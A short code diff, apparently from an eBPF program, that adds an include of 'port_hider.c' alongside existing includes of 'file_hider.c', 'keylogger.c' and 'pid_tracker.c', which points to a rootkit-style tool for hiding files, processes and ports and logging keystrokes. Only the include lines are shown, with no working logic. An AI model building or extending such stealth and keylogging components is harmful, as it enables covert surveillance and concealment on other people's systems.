@@ -10,5 +10,6 @@
 #include "file_hider.c"
 #include "keylogger.c"
 #include "pid_tracker.c"
+#include "port_hider.c"
 
 char _license[] SEC("license") = "GPL";
